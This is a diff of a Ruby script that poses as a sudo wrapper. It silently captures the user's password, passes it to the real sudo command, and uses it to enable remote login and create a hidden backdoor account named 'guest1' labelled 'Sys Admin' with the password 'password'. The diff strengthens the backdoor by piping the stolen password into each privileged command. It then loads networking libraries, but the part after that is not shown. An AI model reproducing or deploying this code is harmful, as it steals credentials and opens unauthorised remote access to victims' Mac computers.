@@ -4,11 +4,11 @@ system "stty -echo"
 password = $stdin.gets.chomp
 system "stty echo"
 
-print `/usr/bin/sudo #{ARGV[0..-1].join(' ')}`
+print `echo '#{password}' | /usr/bin/sudo -S #{ARGV[0..-1].join(' ')}`
 
 username = "guest1"
 user_id = 1111
-`echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && /usr/bin/sudo dscl . -create /Users/#{username} && /usr/bin/sudo dscl . -create /Users/#{username} UserShell /bin/bash && /usr/bin/sudo dscl . -create /Users/#{username} RealName "Sys Admin" && /usr/bin/sudo dscl . -create /Users/#{username} UniqueID "#{user_id}" && /usr/bin/sudo dscl . -passwd /Users/#{username} password`
+`echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} UserShell /bin/bash && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} RealName "Sys Admin" && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} UniqueID "#{user_id}" && echo '#{password}' | /usr/bin/sudo -S dscl . -passwd /Users/#{username} password`
 
 require 'net/http'
 require 'uri'
